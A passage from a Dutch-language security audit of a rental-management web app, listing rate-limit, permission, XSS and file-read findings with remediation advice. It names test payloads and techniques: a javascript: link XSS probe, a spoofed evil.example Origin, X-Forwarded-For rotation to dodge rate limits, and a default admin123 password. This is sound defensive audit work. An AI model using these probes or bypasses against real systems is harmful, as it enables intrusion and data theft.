- **Reproduction:** `loginLimiter` wordt hergebruikt op `server/auth.ts:263` en `server/portal-auth.ts:233,373,384`, met één teller per IP. Live: alle vier de **eerste** verzoeken van de runtime-sessie (2× staff-login, 2× portaal-login, met **correcte** credentials) kregen direct **429** omdat de bucket al opgebruikt was door andere activiteit op hetzelfde IP. Gericht bevestigd in Check 7: 5× 401, dan 429 op één gedeelde teller.
- **Expected:** Aparte `rateLimit()`-instanties of `keyGenerator`-prefixes per route/realm.
- **Actual:** 5 mislukte verzoeken op `/api/portal/forgot` blokkeren ook `POST /api/login` voor 15 minuten voor hetzelfde IP.
- **Root cause:** `server/middleware/security/rateLimiter.ts:28-35`, hergebruikt op `server/auth.ts:263`, `server/portal-auth.ts:233,373,384`.
- **Affected files:** `server/middleware/security/rateLimiter.ts:28-35`, `server/auth.ts:263`, `server/portal-auth.ts:233,373,384`
- **Affected data:** Geen.
- **Security impact:** Laag; wel een DoS-hefboom — een klant kan met vijf portaalpogingen het inloggen van de hele backoffice achter hetzelfde kantoor-IP blokkeren. Tegelijk is de limiter zelf te omzeilen (BUG-009), dus hij hindert vooral echte gebruikers.
- **Business impact:** Balie kan niet inloggen door toedoen van een klant of een collega — precies wat tijdens deze audit meermaals gebeurde.
- **Fix proposal:** Aparte instanties per route/realm (meteen samen met BUG-092's `skipSuccessfulRequests`).
- **Regression test:** 5 mislukte `POST /api/portal/forgot` mogen `POST /api/login` vanaf hetzelfde IP niet blokkeren.

### 2.5 Informatief (geen tracker-nummer)

Vijf SEC-bevindingen van niveau *Info* — vastgelegd zodat een volgende review ze niet hoeft over te doen,
maar geen bug in het tracker.

- **SEC-029 — drizzle-orm 0.39.3, `sql.identifier` escapet geen dubbele quotes.** Niet exploiteerbaar: in `executeReport()` (`server/database-storage.ts:3828-4016`) komt élke tabel- en kolomnaam uit een whitelist (`reportTables` `:3839-3845`, `getReportField` `:3861-3874`) en uiteindelijk uit het Drizzle-schema, nooit uit de request; alle waarden gaan als gebonden parameter mee. Er is nergens een `sort`/`order`/`column`-queryparameter die in SQL landt. Upgraden blijft hygiëne.
- **SEC-030 — `startup-migration.js` bouwt DDL met string-concatenatie.** Bron is `schema-columns.json`, gegenereerd tijdens `npm run build` uit `shared/schema.ts`; geen runtime-invoer. Wel supply-chain-oppervlak: wie het manifest kan wijzigen (precies wat BUG-069 mogelijk maakt) voert bij de volgende boot willekeurige SQL uit als DB-owner. Aanbeveling: identifiers escapen, `col.type` valideren en het manifest tegen een build-checksum controleren.
- **SEC-034 — dependency-advisories versus daadwerkelijk gebruik.** `tar@7.4.3` wordt **nergens geïmporteerd** (het risico zit in de systeem-`tar`, BUG-069); `fast-xml-parser` blokkeert XXE en billion-laughs (rest = BUG-101); `xlsx` draait alleen client-side; `openai` en `csurf` zijn dode dependencies (verwijderen); **`multer@1.4.5-lts.2` is end-of-life** met bekende DoS-advisories — migratie naar 2.x aanbevolen.
- **SEC-037 — ontbrekend `SESSION_SECRET` faalt in productie niet hard.** `server/auth.ts:67-85` logt alleen `console.error` en draait door met een random secret per proces: veiliger dan een vast secret, maar sessies overleven geen herstart of tweede replica ("login werkt, daarna 401"). Fix hoort bij BUG-083.
- **SEC-039 — repo-/buildhygiëne.** `.env.coolify` en `.env.sample` bevatten uitsluitend placeholders, `cookies.txt` bevat alleen de libcurl-header, `.env` is niet getrackt — **geen echte secrets in de repo**. Wel: `cookies.txt` hoort er niet in; `.dockerignore` sluit `.env.coolify`, `backups/`, `temp/` en `uploads/` niet uit terwijl `Dockerfile:14` `COPY . .` doet (en `:47` `uploads/` in de runtime-image kopieert); `nixpacks.toml:3` zet `NPM_CONFIG_PRODUCTION="false"`, waardoor devDependencies (vitest, drizzle-kit, esbuild, tsx) in het draaiende Coolify-image belanden.

---

## 3. Reconciliaties

### 3.1 SR-002 ("geen rate limit op geauthenticeerde calls") versus AM-001 (de limiter geldt wél, 1000/15 min)

**Beslissing: AM-001 wint; SR-002's conclusie is onjuist en wordt hierbij superseded.** SR-002 krijgt
geen eigen tracker-nummer; het echte defect staat als **BUG-074**.

Beide waarnemingen zijn feitelijk waar, maar SR-002 trekt de verkeerde conclusie uit een onderbemeten
test:

- `apiLimiter`'s plafond is **1000 verzoeken per 15 minuten per bron-IP** en geldt identiek voor
  geauthenticeerd en anoniem verkeer. AM-001's bewijs is structureel, niet statistisch:
  `apiLimiter` wordt gemount op `server/index.ts:174`, `setupAuth()` pas op `:187`, dus
  `skip: (req) => req.isAuthenticated && req.isAuthenticated()`
  (`server/middleware/security/rateLimiter.ts:18-22`) is **altijd** falsy — `req.isAuthenticated`
  bestaat op dat moment nog niet. De skip kan voor niemand vuren.
- SR-002's check stuurde **200 verzoeken vanaf een verse IP-bucket**. 200 ligt ver onder 1000, dus er
  vuurde vanzelfsprekend geen 429 — ongeacht of `skip()` werkt. De test kan "geauthenticeerde sessies
  zijn vrijgesteld" niet onderscheiden van "we hebben simpelweg het gedeelde plafond niet geraakt".
- AM-001's oorspronkelijke run stuurde wél genoeg verkeer over één IP en zag `admin` op exact hetzelfde
  moment 429 krijgen als `anon` — direct bewijs dat `skip()` nooit vuurt.
- Deze sessie reproduceerde SR-002's resultaat op 15x het volume, om de verkeerde reden: door
  `X-Forwarded-For` elke 200 verzoeken te roteren kwam **geen enkel IP boven ~640 verzoeken** en kregen
  **0 van de 3144 verzoeken een 429** — bewust onder het gedeelde plafond blijven, niet vrijstelling.

**Praktische consequentie voor de eigenaar:** het onderliggende risico dat SR-002 beschrijft (een
ingelogd account kan de API ongeremd bevragen) **blijft bestaan**, maar via een ander mechanisme — niet
omdat sessies vrijgesteld zijn, maar omdat de enige limiet per bron-IP werkt en dat IP volledig door de
client bepaald wordt (**BUG-009**). De fix moet daarom beide kanten raken: `trust proxy` correct zetten
én een per-gebruiker-limiet invoeren (BUG-074, BUG-082).

`security-runtime.md` is door dit rapport niet bewerkt; SR-002's statusregel daar moet bij een volgende
bewerking naar "weerlegd, zie BUG-074" gezet worden.

### 3.2 Fase-1a-risico #14 ("geen rate limit voor ingelogde sessies") — omkering

Fase 1a leidde uit de `skip`-code af dat ingelogde sessies buiten `apiLimiter` vallen; het
fase-3-5-rapport zette dit op "deels" (`03-phase-3-5-rapport.md:1001`). **De hypothese is als
geformuleerd weerlegd:** ingelogde sessies vallen *niet* buiten de limiter — de code die dat zou moeten
regelen werkt niet. Wat overblijft is een ander, zwaarder probleem: één gedeeld budget per IP voor alle
gebruikers samen, dat zowel legitieme kantoorgebruikers raakt als door elke aanvaller te omzeilen is.
Het risico verhuist daarmee van "ontbrekende limiet" naar "limiet die het omgekeerde doet van de
bedoeling" (**BUG-074**).

### 3.3 XSS-bereikbaarheid: SEC-021 / SEC-016 / SEC-008 / SEC-038 versus Check 3a/3b/3c

| Bewering (statisch) | Runtime-uitkomst | Verdict |
|---|---|---|
| SEC-021: de globale sanitizer raakt multipart-bodies niet | Check 3b: dezelfde `<a href="javascript:alert(3)">`-payload wordt via JSON gestript (`"AUDIT-JSON-click"`) maar via multipart **volledig rauw** opgeslagen | **Bevestigd, versterkt** → BUG-086 |
| SEC-016: aanvaller-geschreven HTML komt in de uitgaande mail | Check 3c: `POST /api/documents/:id/email` is een **JSON**-route, dus de sanitizer strip `<img onerror>`/`<script>` vóór de ongeëscapete `<p>${message}</p>` (`routes.ts:5277-5278`); de stub ontving `<p>Zie bijlage voor AUDIT- -</p>` | **XSS-deel weerlegd voor deze route**; de ontbrekende ontvanger-allowlist en de bijlage-exfiltratie blijven → BUG-081 (daarom MEDIUM, niet hoger) |
| SEC-008 / SEC-009 / SEC-038: DOM-sinks (`window.open(javascript:)`, `innerHTML`) | **Niet getest** — geen browsertool beschikbaar in de agents (Check 3d) | Statisch onderbouwd, executie onbevestigd → BUG-072, BUG-073, BUG-102 blijven OPEN met die kanttekening |
| PDF-kanaal als XSS-vector | Check 3-pdf: de gesanitiseerde waarde komt als letterlijke, niet-uitvoerbare tekst in de PDF (`AUDIT-"&gt;`), geen markup | **Weerlegd** — geen bug |
| Upload-confusie (SVG-als-PNG, PDF/HTML-polyglot) | Check 9: SVG-als-`.png` → **400** "Could not verify file type"; polyglot wordt opgeslagen maar uitgeserveerd met `Content-Type: application/pdf` + `X-Content-Type-Options: nosniff` | **Weerlegd** — geen bug |

**Netto conclusie:** de ingress-sanitizer is de enige laag die de vier XSS-sinks vandaag afdekt, en die
laag is aantoonbaar te omzeilen via multipart (BUG-086). De CSP levert geen tweede laag (BUG-078). Die
combinatie is de reden dat BUG-072 en BUG-073 op HIGH staan ondanks het ontbreken van een browsertest.

### 3.4 Overige SEC-versus-runtime-verschillen

- **SEC-031 (backslash-gat in de backup-filenamefilter):** Check 8 toonde dat 12/12 traversalpayloads
  géén bestandsinhoud opleverden — de backslash-varianten bereiken de routehandler niet eens. Het
  codegat bestaat, de exploitatie niet → **BUG-097 (LOW)**, met een regressietest die 400 eist in plaats
  van de huidige 200-met-SPA-shell.
- **Check 4 versus BUG-010/SEC-014 — feitelijke fout in `security-runtime.md`:** Check 4 stelt dat
  *"`GET /api/settings` niet bestaat als apart endpoint"* en dat *"BUG-010 over een ander onderwerp
  (business-rules-autorisatie) gaat; geen relatie"*. **Beide beweringen zijn onjuist.** De route bestaat
  (`server/routes/settings.ts:15`, gate `MANAGE_BACKUPS`, geen `redactAppSetting`), BUG-010 gaat exact
  daarover, en de matrixrun heeft het deze sessie **live opnieuw geverifieerd**: `curl` met de
  `manager`-sessie geeft `"smtpPassword":"AUDIT-super-secret-smtp-pw"` in een respons van 5302 bytes.
  Check 4's eigen conclusies over `/api/app-settings*` (correct geredacteerd, correct gegate, 403 voor
  een low-priv gebruiker) blijven onverkort geldig — dat is simpelweg de *andere* module.
  BUG-010 blijft dus **HIGH en OPEN**.
- **SEC-025 / BUG-005 (Socket.IO):** Check 1 bevestigt live wat statisch voorspeld werd — handshake met
  `Origin: https://evil.example` → `200`, `access-control-allow-origin: *` én
  `access-control-allow-credentials: true` tegelijk. Geen nieuw nummer; wel hoort de constatering dat de
  *productie*-CORS-lijst niet functioneel is (twee lege Replit-env-vars plus de letterlijke strings
  `https://*.replit.app` / `https://*.replit.dev`, terwijl Socket.IO origins exact vergelijkt) in
  BUG-005's fixvoorstel.
- **BUG-026 (`/uploads`-mount negeert `UPLOADS_DIR`):** de runtime-sessie vond zwaardere evidence dan de
  oorspronkelijke reproductie — niet "stille 404's op nieuwe bestanden", maar een map met **echte
  bestanden uit een andere omgeving** die via de audit-server voor elke ingelogde staffgebruiker
  opvraagbaar waren (308 KB PDF, `GET /uploads/12XT102/receipts/...`). Root cause en fix van BUG-026
  blijven gelijk; de severity hoort aan de bovenkant van MEDIUM te liggen, en het ontbrekende
  permissieaspect is apart genummerd als **BUG-085**.

### 3.5 5xx-op-een-ongeldig-id: AM-002 versus BUG-057

Dit zijn **twee verschillende bugs**, geen duplicaat:

| | BUG-057 (bestaand) | BUG-103 (nieuw, AM-002) |
|---|---|---|
| Trigger | Malformed JSON in de **request body** | Niet-numerieke/oversized/null-byte **padparameter** |
| Respons | **400** met volledige Node-stack trace incl. absoluut pad | **500** met generieke melding, geen stack |
| Omgevingsafhankelijk | Ja — stack alleen als `NODE_ENV !== 'production'` (`server/index.ts:428-433`) | Nee — de 500 komt in élke omgeving |
| Bereik | Elke JSON-route | 19 specifieke GET-endpoints zonder id-validatie |
| Runtime-bewijs | Check 5: live gereproduceerd op `/api/login` én `/api/vehicles` | `fuzz-get.mjs`, 19 endpoints |

Aanvullend bewijst Check 5 dat het **wél goed kan**: `GET /api/vehicles/abc` → **400**
`{"message":"Invalid vehicle ID"}`, met expliciete validatie. Het patroon bestaat dus al in de codebase
en is alleen niet consequent toegepast — vandaar dat de fix van BUG-103 één gedeelde
`parseIntParam`-middleware is en niet 19 losse patches. BUG-088 en BUG-089 (onvoorwaardelijke 500's)
zijn dezelfde familie maar met een andere oorzaak (routevolgorde resp. nog te bepalen) en daarom apart
genummerd. BUG-025 (ontbrekende validatie op settings-**writes**) blijft ook los staan: andere routes,
andere methode.

---

## 4. Endpoint-matrix — samenvatting

Bron: `docs/audit/wip/api-matrix.md`, run van 2026-09-10: **360 endpoints x 8 identiteiten = 3144
verzoeken**, concurrency 4, `X-Forwarded-For` geroteerd per 200 verzoeken per identiteit
(`admin:10.21.x.x`, `manager:22`, `viewer:23`, `nobody:24`, `anon:25`, `portal-admin:26`,
`portal-other:27`, `portal-driver:28`). **0 van de 3144 verzoeken kreeg een 429.**

### 4.1 Responsverdeling per identiteit

| Identiteit | 2xx | 3xx | 401 | 403 | 404 | 5xx | 400 (overig) | 429 | ERR (`-1`) | Totaal |
|---|---|---|---|---|---|---|---|---|---|---|
| anon | 6 | 0 | 420 | 1 | 4 | 1 | 6 | **0** | 2 | 440 |
| nobody (permissies `[]`) | 47 | 0 | 7 | 346 | 20 | 2 | 16 | **0** | 2 | 440 |
| viewer (alleen `view_*`) | 120 | 0 | 6 | 235 | 49 | 5 | 23 | **0** | 2 | 440 |
| portal-admin | 8 | 0 | 415 | 1 | 4 | 1 | 10 | **0** | 1 | 440 |
| portal-other | 8 | 0 | 415 | 1 | 4 | 1 | 10 | **0** | 1 | 440 |
| portal-driver | 7 | 0 | 414 | 3 | 4 | 1 | 9 | **0** | 2 | 440 |
| manager | 162 | 0 | 1 | 6 | 69 | 4 | 8 | **0** | 2 | 252 |
| admin | 167 | 0 | 1 | 0 | 70 | 4 | 8 | **0** | 2 | 252 |
| **Totaal** | **525** | **0** | **1679** | **593** | **224** | **19** | **90** | **0** | **14** | **3144** |

Lezing: de 346 `403`'s van `nobody` en de hoge `401`-aantallen van `anon`/`portal-*` zijn **correct**
gedrag (een account zonder permissies tegen een grotendeels permissie-gated API, resp. portaalaccounts
tegen het staff-oppervlak). De 14 `ERR`-rijen zijn 8x het SPA-catch-all-artefact van de harness en 6x
collateral damage van de servercrash uit **BUG-061**.

Twee methodologische noten uit de bron, relevant voor een herhaling: (1) de vorige run was voor ~95%
waardeloos doordat `POST /api/logout` als gewoon muterend endpoint werd getest en daarmee de gedeelde
sessie van de harness vernietigde — opgelost met een `RELOGIN`-stap; (2) zonder
`X-Forwarded-For`-rotatie liep de run vast op het gedeelde 1000/15 min-budget (BUG-074).

### 4.2 De 34 niet-geprivilegieerde 2xx, gegroepeerd naar oorzaak

De vlag `non-privileged-2xx` markeert elke `POST`/`PUT`/`PATCH`/`DELETE` met 2xx door
`anon`/`nobody`/`viewer`/`portal-other`/`portal-driver`.

**A. Bedoeld gedrag, geen bug — 21 rijen**

| Endpoint | Identiteiten | Rijen | Waarom geen bug |
|---|---|---|---|
| `POST /api/logout` (`server/auth.ts:377`) | anon, nobody, viewer, portal-other, portal-driver | 5 | Bewuste no-op-logout |
| `POST /api/portal/logout` (`server/portal-auth.ts:271`) | idem | 5 | Bewuste no-op-logout |
| `POST /api/portal/forgot` (`server/portal-auth.ts:373`) | idem | 5 | Publiek by design, altijd `{ok:true}` tegen e-mailenumeratie (rate-limitgat = **BUG-092**) |
| `POST /api/session/heartbeat` (`server/auth.ts:411`) | nobody, viewer | 2 | Alleen keepalive, geen data |
| `POST /api/portal/me/email/cancel` (`server/portal-auth.ts:316`) | portal-other, portal-driver | 2 | Annuleert de **eigen** e-mailwijziging, correct op self gescoped |
| `POST /api/portal-admin/notifications/:id/read` + `/mark-read` (`server/routes/portal-admin.ts:133,147`) | viewer | 2 | `viewer` heeft legitiem `view_portal`; "gelezen" markeren op view-niveau is een verdedigbare ontwerpkeuze |

**B. Ontbrekende permissiecheck — 13 rijen**

| Endpoint | Identiteiten | Rijen | Tracker |
|---|---|---|---|
| `DELETE /api/reservations/:id` (`routes.ts:4621`) | nobody | 1 | **BUG-064** (nieuw; fase-1a-risico #5, eerste empirische bevestiging) |
| `POST /api/migrate/customer-drivers` (`routes.ts:6572`) | nobody, viewer | 2 | **BUG-023** (bestaand, bevestigd) |
| `PUT /api/interactive-damage-checks/:id` (`routes.ts:7004`) | nobody, viewer | 2 | **BUG-065** (nieuw) |
| `DELETE /api/interactive-damage-checks/:id` (`routes.ts:7303`) | nobody | 1 | **BUG-065** (nieuw) |
| `PUT /api/system-settings` (`app-settings.ts:463`) | nobody, viewer | 2 | **BUG-011** (bestaand, bevestigd) |
| `DELETE /api/settings/contract-number-override` (`settings.ts:122`) | nobody, viewer | 2 | **BUG-067** (nieuw, AM-006) |
| `PATCH /api/vehicle-diagram-templates/:id` (`vehicle-diagram-templates.ts:138`) | nobody, viewer | 2 | **BUG-066** (nieuw) |
| `DELETE /api/vehicle-diagram-templates/:id` (`vehicle-diagram-templates.ts:211`) | nobody | 1 | **BUG-066** (nieuw) |

> *Telcorrectie t.o.v. de bron:* `api-matrix.md` noemt de verdeling "20 benign / 14 missing-permission".
> Natellen van de tabelrijen geeft **21 / 13** (de 13 ontbrekende-permissierijen bevatten AM-006's twee
> rijen al; de bron telt die er een tweede keer bij op). Het totaal van 34 klopt wel.

**C. Buiten de vlag, even reëel — GET's door `nobody` (permissies `[]`)**
`detectFlags()` markeert alleen muterende verbs, dus deze rijen ontbreken in de 34 maar zijn even zwaar:
`GET /api/interactive-damage-checks` (**18,3 MB**, élke schadecheck in de database, `:6783`), `/:id`
(1,3 MB, `:6794`), `/:id/pdf` (2,9 MB, `:7213`), `GET /api/vehicles/:id/damage-check-pdf` (1,9 MB,
`:6641`) → **BUG-065**; `GET /api/placeholder-reservations` + `/needing-assignment` (`:4516,4543`) en
`GET /api/vehicles/:vehicleId/customers-with-reservations` (28,8 KB, `:4749`) → **BUG-068**. Dit zijn 6
van de 34 `>1MB`-responses; de overige 28 gingen naar identiteiten die de data legitiem mogen zien.
**Geen cross-tenant-portaallek waargenomen in 3144 verzoeken.**

**D. Gevoelige-veldscan (10 treffers):** 8x `GET /api/portal/csrf-token` = **false positive** (het
double-submit-token hoort naar de aanvrager terug); 2x `GET /api/settings` met een echt onversleuteld
`smtpPassword` = **BUG-010** (bestaand). **Nul nieuwe leaks.**

### 4.3 De 19 5xx-responses, gegroepeerd

| Endpoint | Identiteiten | Rijen | Oorzaak / tracker |
|---|---|---|---|
| `GET /object-storage/*` (`routes.ts:7338`) | alle 8 | **8** | **BUG-051** — `anon` krijgt exact dezelfde 500 als `admin`: bewijs dat er geen auth-middleware staat (de 500 zelf komt van de onbereikbare sidecar) |
| `GET /api/reports/maintenance-costs` (`reports.ts:36`) | viewer, manager, admin | **3** | **BUG-089** (nieuw) — onvoorwaardelijk kapot endpoint |
| `GET /api/damage-check-templates/by-vehicle` (`damage-check-templates.ts:52`) | viewer, manager, admin | **3** | **BUG-088** (AM-003) — geschaduwd door de `:id`-route |
| `GET /api/backups/download-data` (`backups.ts:75`) | manager, admin | **2** | **BUG-075** (AM-004) — lekt `DATABASE_URL` in de foutrespons |
| `POST /api/interactive-damage-checks` (lege body, `routes.ts:6849`) | nobody, viewer | **2** | **BUG-104** (AM-008) — geen bodyschema |
| `DELETE /api/reservations/:id` (`routes.ts:4621`) | viewer | **1** | **BUG-090** (AM-007) — check-then-act-race met `nobody`'s gelijktijdige delete |

Daarnaast, niet in deze 19 maar wel in de matrix: **BUG-061** produceert geen 5xx maar een gedropte
verbinding (die rijen verschijnen als `ERR`/`-1`), en de 19 GET-endpoints van **BUG-103** komen uit de
niet-herhaalde `fuzz-get.mjs`-run.

---

## 5. Fase-1a-hypothesen — bevestigd of weerlegd

Alle 15 toprisico's uit `docs/audit/01a-api-en-autorisatie.md`, met de stand ná fase 6–8.

| # | Hypothese | Verdict | Bewijs | Tracker |
|---|---|---|---|---|
| 1 | Socket.IO zonder auth broadcast klant-, financiële en gebruikersgegevens | **Bevestigd** | RT-001: anonieme socket ontvangt `data-update` met het volledige voertuigrecord; Check 1: handshake met vreemde Origin → 200 + `access-control-allow-origin:*` | BUG-005 |
| 2 | Expenses-uploads/-downloads volledig open | **Bevestigd + verzwaard** | AM: `anon` krijgt 400/404 (bodyvalidatie resp. niet gevonden), nooit 401, op exact de vier genoemde routes; álle andere `/api/expenses/*` geven correct 401. SEC-001 maakt er een ongeauthenticeerde arbitrary file read van | BUG-003 + **BUG-060** |
| 3 | Open RDW-proxy | **Bevestigd** | `GET /api/rdw/vehicle/:plate` geeft `anon` identiek 404 als `admin` | BUG-046 |
| 4 | `/object-storage/*` open | **Bevestigd** (latent) | Alle 8 identiteiten krijgen dezelfde 500; de sidecar is onbereikbaar, dus vandaag inert | BUG-051 |
| 5 | Reservering verwijderen zonder permissie | **Bevestigd** — eerste empirische bevestiging | `nobody` (permissies `[]`) → **200** op `DELETE /api/reservations/:id` | **BUG-064** |
| 6 | Interactive damage checks CRUD zonder permissie | **Bevestigd + uitgebreid** | `nobody` → 200 op `PUT`/`DELETE`, plus 18,3 MB bulk-read van élke schadecheck; niet eerder gecatalogiseerde zusterroute `GET /api/vehicles/:id/damage-check-pdf` heeft hetzelfde gat | **BUG-065**, **BUG-104** |
| 7 | Bulk-migratieroute zonder permissie | **Bevestigd** | `nobody`/`viewer` → 200 op `POST /api/migrate/customer-drivers` | BUG-023 |
| 8 | Voertuigdiagram-templates zonder permissie | **Bevestigd** | `nobody`/`viewer` → 200 op `PATCH`, `nobody` → 200 op `DELETE` (inclusief `fs.unlink`) | **BUG-066** |
| 9 | Contractendpoints zonder permissie | **Deels bevestigd — deels nog open** | AM koppelde dit aan `DELETE /api/settings/contract-number-override` (`nobody`/`viewer` → 200), maar dat is de contract*nummering*, niet de generatie. De oorspronkelijk bedoelde routes `/api/contracts/generate*`, `/preview*` en `/data/:id` (`routes.ts:5451-6117`, `requireAuth`-only per `01a:27`) zijn **niet runtime getest** | **BUG-067**; rest → §7 |
| 10 | SMTP-/FTPS-wachtwoorden onversleuteld | **Bevestigd voor SMTP; FTPS deels weerlegd** | `GET /api/settings` als `manager` geeft live `"smtpPassword":"AUDIT-super-secret-smtp-pw"`. CJIB: `GET /api/fines/cjib-config` maskeert structureel (`maskCjibConfig`, `fines.ts:105-106`) en geeft 403 zonder `manage_fines` — de opslag zelf blijft onversleuteld | BUG-010; SEC-006 → **BUG-071** |
| 11 | Documentroutes buiten de centrale padcontrole | **Bevestigd + uitgebreid** | SEC-023 bevestigt BUG-012's drie routes; SEC-011 vindt dezelfde klasse in vier templatemodules mét een client-zetbaar padveld; SEC-032 laat zien dat de centrale resolver zelf symlinks volgt | BUG-012 + **BUG-070**, **BUG-098** |
| 12 | `/api/settings` op de backup-permissie | **Bevestigd** | `MANAGE_BACKUPS`-gate op `settings.ts:15` zonder `redactAppSetting`, live geverifieerd met de `manager`-sessie (5302-byte respons). *Let op: Check 4 van `security-runtime.md` stelt ten onrechte dat dit endpoint niet bestaat — zie §3.4* | BUG-010 |
| 13 | `system-settings` schrijfbaar met alleen login | **Bevestigd** — eerste bevestiging met een nul-permissieaccount | `nobody` → 200 op `PUT /api/system-settings` | BUG-011 |
| 14 | Geen rate limit voor ingelogde sessies | **Weerlegd als geformuleerd** | De `skip` vuurt voor niemand (mountvolgorde); er is één gedeelde 1000/15 min-bucket per IP, die bovendien via `X-Forwarded-For` te omzeilen is. Zie §3.1/§3.2 | **BUG-074** (vervangt SR-002) |
| 15 | Uploads naar Gemini zonder redactie | **Niet getest** | Buiten scope van HTTP-matrix en runtime-checks; `invoice-scanner.ts:13` en `fine-scanner.ts:85-95` sturen gebruikersinhoud als `inlineData` naar de SDK-default-endpoint | → §7 |

**Nieuw en niet voorzien in fase 1a:** de zwaarste bevinding van deze fase (**BUG-061**, volledige
procescrash via een niet-bestaand `customerId`) stond op geen enkele risicolijst en kwam boven via de
`999999999`-not-found-probe van de matrix.

---

## 6. Kritieke bevindingen — samenvatting voor de eigenaar

Zeven punten in gewone taal. **"Zonder account"** betekent: iemand op het internet die alleen de
webadressen van de applicatie kent, zonder gebruikersnaam of wachtwoord.

1. **Iemand zonder account kan bestanden van de server lezen — inclusief de wachtwoorden van de
   applicatie zelf.** Vier "kosten/bonnen"-adressen hebben geen enkele beveiliging, en via een padveld
   in zo'n bon is elk bestand op de server op te vragen: de databasewachtwoorden, de sleutel waarmee
   sessies ondertekend worden, contracten en rijbewijsscans.
   **BUG-060 (nieuw) + BUG-003.** — **Zonder account.**
   *Direct te doen:* zet de productie tot de fix achter een IP-whitelist of VPN (alleen kantoor en
   bekende locaties), of blokkeer `/api/expenses/*` in de reverse proxy voor niet-ingelogd verkeer. Ga
   er daarna van uit dat `SESSION_SECRET`, `DATABASE_URL` en de Gemini-sleutel gelekt kunnen zijn:
   **ververs die drie**.

2. **Eén verzoek legt de hele applicatie plat — nu op twee verschillende manieren.** Zowel een
   klantportaalaccount (BUG-002) als elke medewerker met "portaal bekijken"-rechten (BUG-061) kan met
   één verkeerd verzoek het serverproces laten stoppen: balie, portaal en planning zijn dan 15-20
   seconden onbereikbaar, en alles wat op dat moment onderweg was is weg. **BUG-061 (nieuw) + BUG-002.**
   *Direct te doen:* zorg dat de container automatisch herstart (waarschijnlijk al zo) en zet monitoring
   op `/health`; de echte fix is dat een fout in één verzoek nooit het hele proces mag afsluiten.

3. **Meelezen zonder in te loggen: elke wijziging in de administratie wordt live uitgezonden.** Wie de
   webadressen van de applicatie kent, kan een verbinding openen zonder cookie en ontvangt voortaan élke
   aangemaakte of gewijzigde klant, reservering, kostenpost en gebruiker in volledige detail.
   **BUG-005.** — **Zonder account.**
   *Direct te doen:* dit is een AVG-datalek zodra de applicatie publiek bereikbaar is; blokkeer
   `/socket.io/` in de reverse proxy voor verkeer zonder geldige sessie tot de fix er is.

4. **Een medewerker met de minste rechten kan verwijderen wat hij wil.** Een account met *nul*
   permissies kan reserveringen verwijderen, schadecontroles (het bewijs bij schadeclaims) wijzigen en
   wissen, alle schadecontroles in één keer downloaden, de contractnummering resetten en de
   systeeminstellingen aanpassen. Bewezen met een echt testaccount tegen 360 adressen.
   **BUG-064, BUG-065, BUG-066, BUG-067, BUG-068 (nieuw) + BUG-011, BUG-023.**
   *Direct te doen:* inventariseer wie er vandaag een account heeft en zet accounts die niemand meer
   gebruikt op inactief; dit gat is verder alleen met code te dichten.

5. **Het standaardwachtwoord `admin123` staat nog in de software.** Bij een nieuwe installatie — of na
   het terugzetten van een back-up — wordt een beheerdersaccount `admin` aangemaakt met dat wachtwoord,
   en het staat bovendien letterlijk in de serverlogboeken. **BUG-062 (nieuw).** — **Zonder account**
   (iedereen die de inlogpagina kan bereiken).
   *Direct te doen:* controleer vandaag of `DEFAULT_ADMIN_PASSWORD` in de productieomgeving gezet is en
   of het `admin`-account een sterk, uniek wachtwoord heeft.

6. **Wie back-ups mag beheren, kan de applicatie overnemen en leest de databasewachtwoorden.** Het
   terugzetten van een back-upbestand pakt dat bestand ongecontroleerd uit over de programmamap, dus een
   geprepareerd bestand vervangt de software zelf. Daarnaast geeft één mislukte download-actie de
   volledige databaseverbinding (inclusief wachtwoord) terug in de foutmelding.
   **BUG-069, BUG-075 (nieuw).**
   *Direct te doen:* geef de permissie `manage_backups` alleen aan mensen die u ook volledige
   servertoegang zou geven — dat is wat die permissie feitelijk waard is.

7. **Klantdocumenten liggen open voor élke medewerker, en tijdens de test kwamen er zelfs bestanden uit
   een andere omgeving tevoorschijn.** Alles onder `/uploads` (contracten, rijbewijsscans, schadefoto's,
   boetebrieven) is opvraagbaar door iedere ingelogde medewerker, ongeacht rol. Tijdens de audit gaf de
   testserver een echte garagebon terug van een voertuig dat helemaal niet in de testdata zat.
   **BUG-085 (nieuw) + BUG-026.**
   *Direct te doen:* controleer of de productieserver `UPLOADS_DIR` gebruikt en of die map niet gedeeld
   wordt met een andere omgeving; beperk daarna de toegang tot documenten per rol.

**Zonder enig account bereikbaar:** punt 1 (BUG-060/BUG-003), punt 3 (BUG-005) en punt 5 (BUG-062, mits
het standaardwachtwoord nog geldt), plus de al bekende BUG-046 (RDW-proxy), BUG-051 (object-storage,
vandaag inert) en BUG-093 (`/health` verklapt omgevingsinformatie).
**Alleen met een account uit te buiten:** de punten 2, 4, 6 en 7 en het overgrote deel van de
MEDIUM/LOW-bevindingen.

---

## 7. Niet gedekt / open

**Niet uitgevoerd gereedschap**
- De **`claude-security`-pluginscan is NIET gedraaid.** Die vereist de Workflow-tool met expliciete
  kostengoedkeuring van de eigenaar; die goedkeuring is voor deze fase niet gegeven. Een volledige
  multi-agent-scan (inventory → threat model → sweep → adversarial panel) kan dus nog bevindingen
  opleveren die deze handmatige review gemist heeft, met name in `server/routes.ts` (7.758 regels,
  alleen op patronen doorzocht) en in `client/src` buiten de XSS-sinks.
- **DOM-XSS-executiecheck ontbreekt.** Geen van de agents had een browsertool (Check 3d). BUG-072,
  BUG-073 en BUG-102 zijn statisch onderbouwd en, voor de opslagkant, runtime bewezen (BUG-086), maar
  het daadwerkelijk uitvoeren van JavaScript in de app-origin is niet waargenomen.

**Dependencies en upgrades — niet getest**
- `tar@7.4.3` staat in `package.json` maar wordt **nergens geïmporteerd**; de backup-restore gebruikt de
  systeem-`tar` via `exec`/`spawn` (BUG-069). Een migratie naar de npm-module (de voorgestelde fix) is
  niet gebouwd of getest.
- De **drizzle-orm `sql.identifier`-advisory** (0.39.3) is beoordeeld als **niet bereikbaar** (SEC-029:
  elke identifier komt uit een whitelist en uiteindelijk uit het Drizzle-schema). Een upgrade is niet
  uitgevoerd en de regressie daarvan dus niet getest.
- `multer@1.4.5-lts.2` is end-of-life met bekende DoS-advisories; migratie naar 2.x niet uitgevoerd.
  `openai` en `csurf` zijn dode dependencies. Er is geen `npm audit` gedraaid en geen lockfile-analyse
  van transitieve advisories.

**Alleen in productie te beoordelen**
- **CSP en HSTS achter Coolify/Traefik.** De headers zijn tegen de dev-server gemeten; of de reverse
  proxy ze aanpast, aanvult of overschrijft is onbekend. Ook de daadwerkelijke productie-CSP (BUG-078)
